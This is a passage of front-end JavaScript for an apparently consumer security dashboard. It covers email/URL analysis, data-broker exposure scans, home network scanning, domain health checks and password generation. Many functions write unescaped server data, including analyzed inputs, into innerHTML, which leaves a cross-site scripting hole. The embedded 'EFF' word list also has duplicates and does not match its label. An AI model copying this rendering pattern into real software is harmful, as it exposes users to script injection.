  finally { if (btn) { btn.disabled=false; btn.textContent='Analyze Email'; } }
}

function renderVerdictPanel(panel, r) {
  const icons = { safe:'✅', suspicious:'⚠️', malicious:'🚨' };
  const labels = { safe:'Safe', suspicious:'Suspicious', malicious:'Malicious' };
  const v = r.verdict || 'suspicious';
  panel.className = `verdict-panel ${v}`;
  panel.style.display = '';

  const flags = [...(r.flags||[]), ...(r.indicators||[])];
  panel.innerHTML = `
    <div class="verdict-header">
      <span class="verdict-icon">${icons[v]||'⚠️'}</span>
      <span class="verdict-title">${labels[v]||v}</span>
      <span class="verdict-score">Risk: ${r.risk_score ?? '—'}/100</span>
    </div>
    ${r.redirect_chain && r.redirect_chain.length > 1 ? `<div style="font-size:12px;color:var(--text-3);margin-bottom:8px">Redirects: ${r.redirect_chain.join(' → ')}</div>` : ''}
    ${flags.length ? `<div class="verdict-flags">${flags.map(f=>`<div class="verdict-flag">${f}</div>`).join('')}</div>` : ''}
    ${r.ssl ? `<div style="font-size:12px;color:var(--text-3);margin-top:8px">SSL: ${r.ssl.valid?'✓ Valid':'✗ Invalid'} · ${r.ssl.issuer||''}</div>` : ''}
  `;
}

async function loadAnalyzerHistory() {
  try {
    const items = await api('/api/v1/analyze/history?limit=20');
    const tbody = document.getElementById('analyzerHistTbody');
    if (!tbody) return;
    if (!items.length) { tbody.innerHTML='<tr><td colspan="4" style="text-align:center;padding:20px;color:var(--text-3)">No analyses yet</td></tr>'; return; }
    tbody.innerHTML = items.map(a => {
      const vc = {safe:'#3dd68c',suspicious:'#f0853a',malicious:'#f04f59'}[a.verdict]||'var(--text-3)';
      return `<tr>
        <td style="max-width:260px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${a.input}">${a.input}</td>
        <td><span style="background:rgba(255,255,255,.06);padding:2px 8px;border-radius:5px;font-size:11px">${a.kind}</span></td>
        <td><span style="color:${vc};font-weight:700">${a.verdict}</span></td>
        <td style="color:var(--text-3);font-size:12px">${new Date(a.created_at).toLocaleDateString()}</td>
      </tr>`;
    }).join('');
  } catch(_) {}
}


// ── Digital Footprint ─────────────────────────────────────────────────────────

async function startFootprintScan() {
  const name  = document.getElementById('fpName')?.value.trim();
  const loc   = document.getElementById('fpLocation')?.value.trim() || '';
  const email = document.getElementById('fpEmail')?.value.trim() || '';
  if (!name) { showToast('Full name is required', 'warn'); return; }
  const btn = document.getElementById('fpScanBtn');
  if (btn) { btn.disabled=true; btn.textContent='Scanning…'; }
  try {
    const r = await api('/api/v1/footprint/scan', { method:'POST', json:{ full_name:name, location:loc, email } });
    showToast('Footprint scan started — results in ~30s', 'info');
    // Poll for result
    pollFootprintScan(r.scan_id);
    loadFootprintScans();
  } catch(e) { showToast(e.message, 'error'); }
  finally { if (btn) { btn.disabled=false; btn.textContent='Scan'; } }
}

async function pollFootprintScan(scanId, attempts=0) {
  if (attempts > 20) return;
  try {
    const r = await api(`/api/v1/footprint/scans/${scanId}`);
    if (r.status === 'done') {
      renderFootprintResult(r);
      loadFootprintScans();
    } else if (r.status === 'running') {
      setTimeout(() => pollFootprintScan(scanId, attempts+1), 3000);
    }
  } catch(_) {}
}

function renderFootprintResult(r) {
  const panel = document.getElementById('fpResultPanel');
  if (!panel) return;
  const score = r.exposure_score || 0;
  const colour = score >= 70 ? '#f04f59' : score >= 40 ? '#f0853a' : '#3dd68c';
  const results = r.results || [];

  panel.style.display = '';
  panel.innerHTML = `
    <div class="footprint-scan-result-header">
      <div class="footprint-summary-text">
        <h3>${r.full_name}</h3>
        <p>${r.exposures_found || 0} exposure${r.exposures_found!==1?'s':''} found across ${r.sources_checked || 0} data broker${r.sources_checked!==1?'s':''}</p>
      </div>
      <div style="text-align:center">
        <div style="font-size:28px;font-weight:900;color:${colour}">${score}</div>
        <div style="font-size:11px;color:var(--text-3)">Exposure Score</div>
      </div>
    </div>

    <div class="exposure-meter">
      <div class="exposure-meter-label"><span>Exposure Level</span><span style="color:${colour}">${score >= 70 ? 'High' : score >= 40 ? 'Medium' : 'Low'}</span></div>
      <div class="exposure-meter-track"><div class="exposure-meter-fill" style="width:${score}%;background:${colour}"></div></div>
    </div>

    <div class="broker-results-grid">
      ${results.map(b => `
        <div class="broker-card ${b.found ? 'exposed' : b.confidence === 'unknown' ? 'unknown' : 'clean'}">
          <div class="broker-card-header">
            <span class="broker-card-icon">${b.found ? '🔴' : '🟢'}</span>
            <span class="broker-card-name">${b.broker}</span>
            <span class="broker-card-status ${b.found ? 'exposed' : 'clean'}">${b.found ? 'EXPOSED' : 'CLEAN'}</span>
          </div>
          ${b.found ? `<div class="broker-card-desc">Your data appears in this broker's database (confidence: ${b.confidence||'medium'}).</div>` : ''}
          ${b.optout_url ? `<a class="broker-optout" href="${b.optout_url}" target="_blank" rel="noopener">→ Request opt-out removal</a>` : ''}
        </div>`).join('')}
    </div>`;
}

async function loadFootprintScans() {
  try {
    const scans = await api('/api/v1/footprint/scans');
    const tbody = document.getElementById('fpScansTbody');
    if (!tbody) return;
    if (!scans.length) { tbody.innerHTML='<tr><td colspan="4" style="text-align:center;padding:20px;color:var(--text-3)">No scans yet</td></tr>'; return; }
    tbody.innerHTML = scans.map(s => {
      const sc = s.exposure_score || 0;
      const c  = sc >= 70 ? '#f04f59' : sc >= 40 ? '#f0853a' : '#3dd68c';
      return `<tr>
        <td>${s.full_name}</td>
        <td><span style="color:${c};font-weight:700">${s.status==='done'?sc:'—'}</span></td>
        <td style="color:var(--text-3);font-size:12px">${s.status}</td>
        <td>
          ${s.status==='done' ? `<button class="btn btn-ghost btn-sm" onclick="loadFootprintScanDetail('${s.id}')">View</button>` : ''}
        </td>
      </tr>`;
    }).join('');
  } catch(_) {}
}

async function loadFootprintScanDetail(id) {
  try {
    const r = await api(`/api/v1/footprint/scans/${id}`);
    renderFootprintResult(r);
    document.getElementById('fpResultPanel')?.scrollIntoView({ behavior:'smooth', block:'nearest' });
  } catch(e) { showToast(e.message, 'error'); }
}

// ══════════════════════════════════════════════════════════════════════════════
// HOME GUARDIAN
// ══════════════════════════════════════════════════════════════════════════════

let _guardianActiveScanId = null;
let _guardianPollTimer    = null;

async function initHomeGuardian() {
  // Check probe status and load past scans
  try {
    const status = await api('/api/v1/guardian/status');
    if (!status.probe_online) {
      document.getElementById('guardianOnboard').style.display = '';
    } else {
      document.getElementById('guardianOnboard').style.display = 'none';
    }
    // If there's a last scan, load it automatically
    if (status.last_scan_id) {
      await guardianLoadScan(status.last_scan_id);
    }
  } catch(e) {
    // Probe endpoint not responding — show onboard
    const el = document.getElementById('guardianOnboard');
    if (el) el.style.display = '';
  }
  loadGuardianScans();
}

function guardianStartScan() {
  const form = document.getElementById('guardianScanForm');
  if (form) form.style.display = form.style.display === 'none' ? '' : 'none';
}

async function guardianSubmitScan() {
  const target = document.getElementById('guardianTarget')?.value.trim() || '192.168.1.0/24';
  const name   = document.getElementById('guardianName')?.value.trim()   || 'Home Network Scan';

  document.getElementById('guardianScanForm').style.display = 'none';
  document.getElementById('guardianOverview').style.display = 'none';
  _showGuardianScanning(target);

  try {
    const r = await api('/api/v1/guardian/scan', { method:'POST', json:{ target, name } });
    _guardianActiveScanId = r.scan_id;
    _guardianPollScan(r.scan_id);
    loadGuardianScans();
  } catch(e) {
    _hideGuardianScanning();
    showToast(e.message, 'error');
  }
}

function _showGuardianScanning(target) {
  document.getElementById('guardianScanning').style.display = '';
  setText('guardianScanStatus', `Scanning ${target}…`);
  setText('guardianScanSub', 'Discovering devices and checking for vulnerabilities — this takes 60–90 seconds');
  // Cycle status messages for UX
  const msgs = [
    ['Discovering devices…',         'Sending ping sweep across your network'],
    ['Checking open ports…',         'Testing each device for exposed services'],
    ['Analyzing services…',          'Identifying device types and software'],
    ['Checking for vulnerabilities…','Looking up known issues for discovered services'],
    ['Generating your report…',      'Translating findings into plain English'],
  ];
  let i = 0;
  _guardianPollTimer = setInterval(() => {
    if (i < msgs.length) {
      setText('guardianScanStatus', msgs[i][0]);
      setText('guardianScanSub',    msgs[i][1]);
      i++;
    }
  }, 18000);
}

function _hideGuardianScanning() {
  document.getElementById('guardianScanning').style.display = 'none';
  if (_guardianPollTimer) { clearInterval(_guardianPollTimer); _guardianPollTimer = null; }
}

async function _guardianPollScan(scanId, attempts = 0) {
  if (attempts > 40) {
    _hideGuardianScanning();
    showToast('Scan is taking longer than expected — check back later', 'warn');
    return;
  }
  try {
    const r = await api(`/api/v1/guardian/scans/${scanId}`);
    if (r.status === 'completed') {
      _hideGuardianScanning();
      renderGuardianReport(r);
      loadGuardianScans();
    } else if (r.status === 'failed') {
      _hideGuardianScanning();
      showToast('Scan failed — check probe connection', 'error');
    } else {
      setTimeout(() => _guardianPollScan(scanId, attempts + 1), 5000);
    }
  } catch(_) {
    setTimeout(() => _guardianPollScan(scanId, attempts + 1), 6000);
  }
}

async function guardianLoadScan(scanId) {
  try {
    const r = await api(`/api/v1/guardian/scans/${scanId}`);
    if (r.status === 'completed') renderGuardianReport(r);
    else if (r.status === 'running') {
      _showGuardianScanning(r.target || '');
      _guardianPollScan(scanId);
    }
  } catch(_) {}
}

function renderGuardianReport(r) {
  const overview = document.getElementById('guardianOverview');
  if (!overview) return;
  overview.style.display = '';

  // Summary bar
  setText('gStatDevices', r.device_count ?? 0);
  setText('gStatIssues',  r.total_issues ?? 0);
  setText('gStatCritical',r.critical_issues ?? 0);
  const grade = r.network_grade || '?';
  setText('gStatGrade', grade);
  const gradeIcon = {A:'🏆', B:'✅', C:'⚠️', D:'🔶', F:'🚨'}[grade] || '📊';
  setText('gGradeIcon', gradeIcon);

  // Device grid
  const grid = document.getElementById('guardianDeviceGrid');
  if (grid) {
    if (!r.devices || !r.devices.length) {
      grid.innerHTML = '<div class="empty-state">No devices found — make sure your probe is on the same network as the target range.</div>';
    } else {
      grid.innerHTML = r.devices.map(d => {
        const riskClass = d.risk.toLowerCase();
        const portChips = (d.open_ports || []).slice(0, 6).map(p =>
          `<span class="guardian-port-chip">${p}</span>`).join('');
        const more = d.open_ports.length > 6 ? `<span class="guardian-port-chip">+${d.open_ports.length-6}</span>` : '';
        return `<div class="guardian-device-card risk-${riskClass}" onclick="showGuardianDevice(${JSON.stringify(d).replace(/"/g,'&quot;')})">
          <div class="guardian-device-header">
            <span class="guardian-device-icon">${d.icon}</span>
            <div class="guardian-device-info">
              <div class="guardian-device-type">${d.device_type}</div>
              <div class="guardian-device-ip">${d.ip}</div>
            </div>
            <span class="guardian-risk-badge ${riskClass}">${d.risk}</span>
          </div>
          ${portChips || more ? `<div class="guardian-device-ports">${portChips}${more}</div>` : ''}
          <div class="guardian-device-issues">
            ${d.issue_count > 0
              ? `<strong>${d.issue_count} issue${d.issue_count>1?'s':''}</strong> found — click to review`
              : '✓ No issues found'}
          </div>
        </div>`;
      }).join('');
    }
  }

  // Recommendations
  const recEl = document.getElementById('guardianRecommendations');
  if (recEl) {
    if (!r.recommendations || !r.recommendations.length) {
      recEl.innerHTML = '<div class="empty-state" style="font-size:13px">No issues found — your network looks clean!</div>';
    } else {
      recEl.innerHTML = r.recommendations.map(rec => `
        <div class="guardian-rec">
          <span class="guardian-rec-sev ${rec.severity}">${rec.severity.toUpperCase()}</span>
          <div class="guardian-rec-body">
            <div class="guardian-rec-title">${rec.title}</div>
            <div class="guardian-rec-host">${rec.host}</div>
          </div>
        </div>`).join('');
    }
  }
}

function showGuardianDevice(d) {
  const modal = document.getElementById('guardianDeviceModal');
  if (!modal) return;

  setText('gdmIcon',     d.icon);
  setText('gdmTitle',    d.device_type);
  setText('gdmSubtitle', `${d.ip} · ${d.open_ports.length} open port${d.open_ports.length!==1?'s':''} · ${d.risk} risk`);

  const body = document.getElementById('gdmBody');
  if (body) {
    if (!d.findings || !d.findings.length) {
      body.innerHTML = '<div class="empty-state">No issues found on this device.</div>';
    } else {
      body.innerHTML = d.findings.map(f => `
        <div class="guardian-finding ${f.severity}">
          <div class="guardian-finding-title">${f.title}</div>
          <div class="guardian-finding-desc">${f.description}</div>
          ${f.remediation ? `<div class="guardian-finding-fix">→ ${f.remediation}</div>` : ''}
        </div>`).join('');
    }
  }

  modal.style.display = 'flex';
}

function closeGuardianDeviceModal() {
  const m = document.getElementById('guardianDeviceModal');
  if (m) m.style.display = 'none';
}

async function loadGuardianScans() {
  try {
    const scans = await api('/api/v1/guardian/scans');
    const tbody = document.getElementById('guardianScansTbody');
    if (!tbody) return;
    if (!scans.length) {
      tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;padding:20px;color:var(--text-3)">No scans yet</td></tr>';
      return;
    }
    tbody.innerHTML = scans.map(s => {
      const statusColour = {completed:'#3dd68c',running:'#7c6af7',failed:'#f04f59'}[s.status] || 'var(--text-3)';
      return `<tr>
        <td style="font-weight:600">${s.name}</td>
        <td style="font-family:monospace;font-size:12px;color:var(--text-3)">${s.target}</td>
        <td>${s.finding_count > 0 ? `${s.finding_count - s.critical_count} normal` : '—'}</td>
        <td style="color:${s.critical_count>0?'#f04f59':'#3dd68c'}">${s.critical_count > 0 ? `⚠ ${s.critical_count}` : '✓ None'}</td>
        <td style="color:${statusColour}">${s.status}</td>
        <td>
          ${s.status==='completed' ? `<button class="btn btn-ghost btn-sm" onclick="guardianLoadScan('${s.scan_id}')">View</button>` : ''}
        </td>
      </tr>`;
    }).join('');
  } catch(_) {}
}

// ══════════════════════════════════════════════════════════════════════════════
// DOMAIN GUARDIAN
// ══════════════════════════════════════════════════════════════════════════════

let _dgDomains = [];
let _dgActiveDomainId = null;
let _dgPollTimers = {};   // domain_id → timer

async function loadDomainGuardian() {
  try {
    const domains = await api('/api/v1/domain-guardian');
    _dgDomains = domains;
    renderDomainGrid(domains);
    // Resume polling for any still-pending domains
    domains.filter(d => d.status === 'pending').forEach(d => _dgPollDomain(d.id));
  } catch(e) {
    const grid = document.getElementById('dgDomainGrid');
    if (grid) grid.innerHTML = `<div class="empty-state" style="grid-column:1/-1">Failed to load domains: ${e.message}</div>`;
  }
}

function showDomainAddForm() {
  const f = document.getElementById('dgAddForm');
  if (f) f.style.display = f.style.display === 'none' ? '' : 'none';
}

function renderDomainGrid(domains) {
  const grid = document.getElementById('dgDomainGrid');
  if (!grid) return;
  if (!domains.length) {
    grid.innerHTML = '<div class="empty-state" style="grid-column:1/-1">No domains monitored yet. Click "+ Add Domain" to start.</div>';
    return;
  }
  grid.innerHTML = domains.map(d => _dgCardHTML(d)).join('');
}

function _dgCardHTML(d) {
  const scoreColour = d.health_score >= 80 ? '#3dd68c' : d.health_score >= 60 ? '#f0853a' : '#f04f59';
  const isPending = d.status === 'pending';

  const checks = [
    { label: 'SSL',   pass: d.ssl_valid,   warn: d.ssl_days_remaining !== null && d.ssl_days_remaining <= 30 },
    { label: 'SPF',   pass: d.spf_valid   },
    { label: 'DMARC', pass: d.dmarc_valid },
    { label: 'DKIM',  pass: d.dkim_valid  },
  ];

  const checkHTML = isPending
    ? '<div class="dg-pending"><div class="dg-spinner"></div>Checking…</div>'
    : `<div class="dg-checks">${checks.map(c => {
        const dotClass = !c.pass ? 'fail' : c.warn ? 'warn' : 'pass';
        return `<div class="dg-check"><div class="dg-check-dot ${dotClass}"></div>${c.label}</div>`;
      }).join('')}</div>`;

  const issueCount = (d.issues || []).length;
  const lastChecked = d.last_checked ? new Date(d.last_checked).toLocaleDateString() : 'Pending';

  return `
    <div class="dg-card status-${d.status}" onclick="viewDomainDetail('${d.id}')">
      <div class="dg-card-header">
        <div style="flex:1">
          <div class="dg-card-domain">${d.domain}</div>
          ${d.label ? `<div class="dg-card-label">${d.label}</div>` : ''}
        </div>
        ${isPending ? '' : `<div class="dg-score-badge" style="color:${scoreColour}">${d.health_score}</div>`}
      </div>
      ${checkHTML}
      <div class="dg-card-footer">
        <span class="dg-issue-count ${issueCount ? 'has-issues' : ''}">
          ${isPending ? 'Scanning…' : issueCount ? `⚠ ${issueCount} issue${issueCount>1?'s':''}` : '✓ All clear'}
        </span>
        <span>${lastChecked}</span>
      </div>
    </div>`;
}

async function addDomainMonitor() {
  const domain = document.getElementById('dgNewDomain')?.value.trim();
  const label  = document.getElementById('dgNewLabel')?.value.trim() || '';
  if (!domain) { showToast('Enter a domain name', 'warn'); return; }
  try {
    await api('/api/v1/domain-guardian', { method:'POST', json:{ domain, label } });
    document.getElementById('dgNewDomain').value = '';
    document.getElementById('dgNewLabel').value  = '';
    document.getElementById('dgAddForm').style.display = 'none';
    showToast(`Monitoring ${domain} — checking now…`, 'info');
    await loadDomainGuardian();
  } catch(e) { showToast(e.message, 'error'); }
}

async function deleteDomainMonitor(id, domain, event) {
  event.stopPropagation();
  if (!confirm(`Stop monitoring ${domain}?`)) return;
  try {
    await api(`/api/v1/domain-guardian/${id}`, { method:'DELETE' });
    if (_dgActiveDomainId === id) document.getElementById('dgDetailPanel').style.display = 'none';
    await loadDomainGuardian();
  } catch(e) { showToast(e.message, 'error'); }
}

function _dgPollDomain(id, attempts = 0) {
  if (attempts > 30) return;
  const timer = setTimeout(async () => {
    try {
      const d = await api(`/api/v1/domain-guardian/${id}`);
      // Update card in grid
      _dgDomains = _dgDomains.map(x => x.id === id ? d : x);
      const card = document.querySelector(`[onclick="viewDomainDetail('${id}')"]`);
      if (card) card.outerHTML = _dgCardHTML(d);
      if (d.status === 'pending') {
        _dgPollDomain(id, attempts + 1);
      } else if (_dgActiveDomainId === id) {
        renderDomainDetail(d);
      }
    } catch(_) {
      _dgPollDomain(id, attempts + 1);
    }
  }, 4000);
  _dgPollTimers[id] = timer;
}

async function viewDomainDetail(id) {
  _dgActiveDomainId = id;
  const panel = document.getElementById('dgDetailPanel');
  if (!panel) return;
  panel.style.display = '';

  try {
    const d = await api(`/api/v1/domain-guardian/${id}`);
    renderDomainDetail(d);
    panel.scrollIntoView({ behavior:'smooth', block:'nearest' });
  } catch(e) {
    document.getElementById('dgDetailBody').innerHTML = `<div class="empty-state">Error: ${e.message}</div>`;
  }
}

async function refreshDomainDetail() {
  if (!_dgActiveDomainId) return;
  showToast('Re-checking domain…', 'info');
  try {
    await api(`/api/v1/domain-guardian/${_dgActiveDomainId}/refresh`, { method:'POST' });
    _dgPollDomain(_dgActiveDomainId);
  } catch(e) { showToast(e.message, 'error'); }
}

function renderDomainDetail(d) {
  setText('dgDetailDomain', d.domain);
  setText('dgDetailLabel', d.label || '');

  const body = document.getElementById('dgDetailBody');
  if (!body) return;

  if (d.status === 'pending') {
    body.innerHTML = '<div class="dg-pending"><div class="dg-spinner"></div>Checking domain — this takes ~30 seconds…</div>';
    return;
  }

  const scoreColour = d.health_score >= 80 ? '#3dd68c' : d.health_score >= 60 ? '#f0853a' : '#f04f59';

  const sslDays = d.ssl_days_remaining;
  const sslDaysColour = sslDays === null ? 'var(--text-3)' : sslDays <= 14 ? 'bad' : sslDays <= 30 ? 'warn' : 'good';
  const sslDaysText   = sslDays === null ? '—' : sslDays <= 0 ? 'EXPIRED' : `${sslDays} days`;

  const whoisDays = d.whois_days_remaining;
  const whoisColour = whoisDays === null ? 'var(--text-3)' : whoisDays <= 30 ? 'bad' : whoisDays <= 60 ? 'warn' : 'good';
  const whoisText   = whoisDays === null ? '—' : whoisDays <= 0 ? 'EXPIRED' : `${whoisDays} days`;

  body.innerHTML = `
    <!-- Score + overview -->
    <div style="display:flex;align-items:center;gap:20px;margin-bottom:20px;padding:16px 20px;
      border-radius:12px;background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.08)">
      <div style="font-size:40px;font-weight:900;color:${scoreColour}">${d.health_score}</div>
      <div>
        <div style="font-size:14px;font-weight:700;margin-bottom:2px">Health Score</div>
        <div style="font-size:12px;color:var(--text-3)">
          ${d.issues.length ? `${d.issues.length} issue${d.issues.length>1?'s':''} found` : 'No issues found'}
          · Last checked ${d.last_checked ? new Date(d.last_checked).toLocaleString() : 'never'}
        </div>
      </div>
      <div style="margin-left:auto">
        <button class="btn btn-ghost btn-sm" style="color:#f04f59"
          onclick="deleteDomainMonitor('${d.id}','${d.domain}',event)">Remove</button>
      </div>
    </div>

    <!-- Detail grid -->
    <div class="dg-detail-grid">
      <!-- SSL -->
      <div class="dg-section">
        <div class="dg-section-title">🔒 SSL Certificate</div>
        <div class="dg-row"><span class="dg-row-label">Valid</span>
          <span class="dg-row-val ${d.ssl_valid?'good':'bad'}">${d.ssl_valid?'✓ Yes':'✗ No'}</span></div>
        <div class="dg-row"><span class="dg-row-label">Expires In</span>
          <span class="dg-row-val ${sslDaysColour}">${sslDaysText}</span></div>
        <div class="dg-row"><span class="dg-row-label">Issuer</span>
          <span class="dg-row-val" style="font-size:12px">${d.ssl_issuer||'—'}</span></div>
      </div>

      <!-- WHOIS -->
      <div class="dg-section">
        <div class="dg-section-title">📋 Domain Registration</div>
        <div class="dg-row"><span class="dg-row-label">Domain Expires In</span>
          <span class="dg-row-val ${whoisColour}">${whoisText}</span></div>
        <div class="dg-row"><span class="dg-row-label">Registrar</span>
          <span class="dg-row-val" style="font-size:12px">${d.registrar||'—'}</span></div>
      </div>

      <!-- DNS -->
      <div class="dg-section">
        <div class="dg-section-title">📡 Email Security (DNS)</div>
        <div class="dg-row"><span class="dg-row-label">SPF Record</span>
          <span class="dg-row-val ${d.spf_valid?'good':'bad'}">${d.spf_valid?'✓ Found':'✗ Missing'}</span></div>
        <div class="dg-row"><span class="dg-row-label">DMARC Policy</span>
          <span class="dg-row-val ${d.dmarc_valid?'good':'bad'}">
            ${d.dmarc_valid ? `✓ ${d.dmarc_policy||'set'}` : '✗ Missing'}</span></div>
        <div class="dg-row"><span class="dg-row-label">DKIM Signature</span>
          <span class="dg-row-val ${d.dkim_valid?'good':'bad'}">${d.dkim_valid?'✓ Found':'✗ Not found'}</span></div>
        ${d.mx_records && d.mx_records.length ? `
          <div class="dg-row"><span class="dg-row-label">Mail Server</span>
            <span class="dg-row-val" style="font-size:11px;max-width:180px;overflow:hidden;text-overflow:ellipsis">${d.mx_records[0]}</span></div>` : ''}
      </div>

      <!-- Lookalikes -->
      <div class="dg-section">
        <div class="dg-section-title">🎭 Lookalike Domains</div>
        ${d.lookalike_count === 0
          ? '<div style="font-size:13px;color:#3dd68c;margin-top:6px">✓ No lookalike domains found</div>'
          : `<div style="font-size:13px;color:#f04f59;font-weight:700;margin-bottom:8px">
              ⚠ ${d.lookalike_count} lookalike${d.lookalike_count>1?'s':''} registered
             </div>
             <div class="dg-lookalike-list">
               ${(d.lookalikes||[]).slice(0,10).map(l=>`<span class="dg-lookalike-chip">${l}</span>`).join('')}
               ${d.lookalikes.length>10?`<span class="dg-lookalike-chip">+${d.lookalikes.length-10} more</span>`:''}
             </div>`
        }
      </div>
    </div>

    <!-- Issues -->
    ${d.issues && d.issues.length ? `
      <div class="card-title" style="margin-bottom:12px">Issues Found (${d.issues.length})</div>
      ${d.issues.map(issue => `
        <div class="dg-issue">
          <span class="dg-issue-sev ${issue.severity}">${issue.severity.toUpperCase()}</span>
          <div class="dg-issue-body">
            <div class="dg-issue-title">${issue.title}</div>
            <div class="dg-issue-desc">${issue.desc}</div>
          </div>
        </div>`).join('')}
    ` : `<div class="empty-state" style="margin-top:8px">✓ No issues found — domain health looks good!</div>`}
  `;
}

// ══════════════════════════════════════════════════════════════════════════════
// PASSWORD TOOLS
// ══════════════════════════════════════════════════════════════════════════════

// ── EFF Short Word List (436 words — balanced coverage, no offensive words) ──
const _PW_WORDS = (`able acid acne acre also arch area army aunt back bail bale band bank barn bash bath bean bear belt
bend best bill bind bird bite blow blue blur boar boat body bold bolt bond bone book bore born boss both bowl brag bran
brew brow buck bull burn burp bush buzz cafe calm camp cane cape card care cart cash cast cave chef chin chip chop clam
clap clay clip clod clog club clue coal coat coil coin comb cone cook cord core cork corn cosy cozy crab crop crow cube
curb cure curl curt cute dame damp dark dart dash data dawn deal dean debt deck deed deep deny desk dial diet dime dine
dirt disk dive dock dock dome done door dose dote dove down draft drag draw drew drip drop drum dual duly dumb dump dusk
dust each earl earn ease east edge else envy epic even exam fact fade fail fair fall fame fang farm fast fate fawn feel
feet fell felt fend fern fife file fill film fist fizz flag flaw flea fled flung foam fold fond font ford fore fork
form fort foul fowl fray frog from fuel full fund fuse gale game gape garb gate gaze gear gent gild gill glee glue
glum goad goal goes gold golf gong gore gown grab gram gray grew grin grip grit glow gust guts hack hail half hall
halt hand hang hard harm harp hart hash haul hawk heal heap heat heel helm help herb herd high hike hill hint hive
hold hole holm holy home honk hoop hope horn host howl hull hump hung hunt husk idol inch iris iris iron isle itch
item jab jack jade jail jape jerk jest jibe jilt jive jump junk jury just keen keep kelp kept kick kill kiln kind
king kink knob know lack laid lake lame lamp land lane lark lash last late laud lean leap left lend lens lest levy
lick lift limb lind line lint list live load loaf loan lob lock loft loin lone long look loop lore lorn lour love
lure lurk lust lute luxe mace maid main male mall mane mare mark marsh mast math maze meal meld melt memo mend mesh
mild milk mill mime mind mint mire mist mock mode mole mold molt monk mope more moss moth mould move much muck mule
mute myth nail name nape navy near neat need news next nigh node none nook noon norm nose note noun nude null oafs
oboe orca oust oval over oven pack pact page paid pail palm pane park part past pave pawn peak peat peel peer pelt
perk pest pick pier pile pill pine pink pipe pity plan play plea plod plop plot plow ploy plum plus poke poll pond
poor pope pork port pose post pout prey prod prop prow puck pull pump punt pure push rage raid rail rain rake ramp
rang rank rant rare rash rasp rate rave read real reap reel rely rend rend rent rest ride rife rift ring rink riot
rise risk robe rode romp roof rook room rope rose rosy rout rove rowdy ruby ruin rule ruse rush rust rut sack safe
sage sail sale salt same sane sang sank sash save scam scan scar seed seek seep self sell semi sent shag shed shin
ship shoe shop shot shot shun shut sign silk sill sink sire site size skid skip slag slap sled slid slim slip slob
slop slur snag snap snip snob snow soap soar sock soil sold sole some song soot sort soul soup sour span spar spit
spot spry spur stab stag stem step stew stir stop stub stud stun such suit sulk sung sunk sway swear swim swot tack
tail tale tame tang tape tare taut taxi tell tend tent term test text than that thaw tick tilt time tiny toad toll
tomb tone took tool tore torn toss tour town tram trap tray trim trio trod trot trout truce true tuck tuft tug tuna
turf turn tusk tutu twin type ugly upon used user vain vale vane vary vast veer veil vend vent very veto vibe vine
void vote wade wage wail wait wake wane ward warm warp wart wave ways weak weal wean weed well wept wham whim whip
whit wile will wilt wimp wine wing wink wire wise wish wisp with woe wolf womb wonk wont wore wort wrap wren yell
yore zero zone zoom`).split(/\s+/).filter(w => w.length >= 3);

// ── State ─────────────────────────────────────────────────────────────────────
let _pwMode    = 'password';
let _pwHistory = [];

function initPasswordTools() {
  pwGenerate();
}

// ── Mode switch ───────────────────────────────────────────────────────────────
function pwSetMode(mode) {
  _pwMode = mode;
  document.querySelectorAll('.pw-mode-tab').forEach(t => t.classList.toggle('active', t.dataset.mode === mode));
  document.getElementById('pwConfigPassword').style.display   = mode === 'password'   ? '' : 'none';
  document.getElementById('pwConfigPassphrase').style.display = mode === 'passphrase' ? '' : 'none';
  document.getElementById('pwConfigPin').style.display        = mode === 'pin'        ? '' : 'none';
  document.getElementById('pwStrengthWrap').style.display     = mode === 'pin'        ? 'none' : '';
  pwGenerate();
}

function pwLenDisplay(v) { document.getElementById('pwLenVal').textContent = v; }

// ── Crypto-safe random ────────────────────────────────────────────────────────
function _randInt(max) {
  const arr = new Uint32Array(1);
  crypto.getRandomValues(arr);
  return arr[0] % max;
}

function _shuffle(arr) {
  for (let i = arr.length - 1; i > 0; i--) {
    const j = _randInt(i + 1);
    [arr[i], arr[j]] = [arr[j], arr[i]];
  }
  return arr;
}

// ── Generators ────────────────────────────────────────────────────────────────
function _genPassword() {
  const len      = parseInt(document.getElementById('pwLength').value);
  const upper    = document.getElementById('pwUpper').checked;
  const lower    = document.getElementById('pwLower').checked;
  const numbers  = document.getElementById('pwNumbers').checked;
  const symbols  = document.getElementById('pwSymbols').checked;
  const noAmbig  = document.getElementById('pwNoAmbig').checked;

  const AMBIG = new Set('0O1lI');
  let chars = '';
  const required = [];

  if (upper)   { const s = noAmbig ? 'ABCDEFGHJKMNPQRSTUVWXYZ' : 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'; chars += s; required.push(s[_randInt(s.length)]); }
  if (lower)   { const s = noAmbig ? 'abcdefghjkmnpqrstuvwxyz' : 'abcdefghijklmnopqrstuvwxyz'; chars += s; required.push(s[_randInt(s.length)]); }
  if (numbers) { const s = noAmbig ? '23456789' : '0123456789'; chars += s; required.push(s[_randInt(s.length)]); }
  if (symbols) { const s = '!@#$%^&*()-_=+[]{}|;:,.<>?'; chars += s; required.push(s[_randInt(s.length)]); }
  if (!chars)  chars = 'abcdefghijklmnopqrstuvwxyz';

  const rest = Array.from({length: len - required.length}, () => chars[_randInt(chars.length)]);
  return _shuffle([...required, ...rest]).join('');
}

function _genPassphrase() {
  const count    = parseInt(document.getElementById('pwWordCount').value);
  const sep      = document.getElementById('pwSeparator').value;
  const cap      = document.getElementById('ppCapitalize').checked;
  const addNum   = document.getElementById('ppNumber').checked;

  const words = Array.from({length: count}, () => {
    const w = _PW_WORDS[_randInt(_PW_WORDS.length)];
    return cap ? w[0].toUpperCase() + w.slice(1) : w;
  });
  if (addNum) words.push(String(_randInt(90) + 10));
  return words.join(sep);
}

function _genPin() {
  const len = parseInt(document.getElementById('pwPinLen').value);
  return Array.from({length: len}, () => _randInt(10)).join('');
}

// ── Main generate ─────────────────────────────────────────────────────────────
function pwGenerate() {
  let pw = '';
  if (_pwMode === 'password')   pw = _genPassword();
  else if (_pwMode === 'passphrase') pw = _genPassphrase();
  else                          pw = _genPin();

  document.getElementById('pwOutput').textContent = pw;
  document.getElementById('pwStrengthWrap').style.display = _pwMode === 'pin' ? 'none' : '';
  if (_pwMode !== 'pin') _renderStrength(pw, 'pwStrengthFill', 'pwStrengthLabel', 'pwStrengthEntropy', 'pwCrackTime');

  // Clear stale breach result
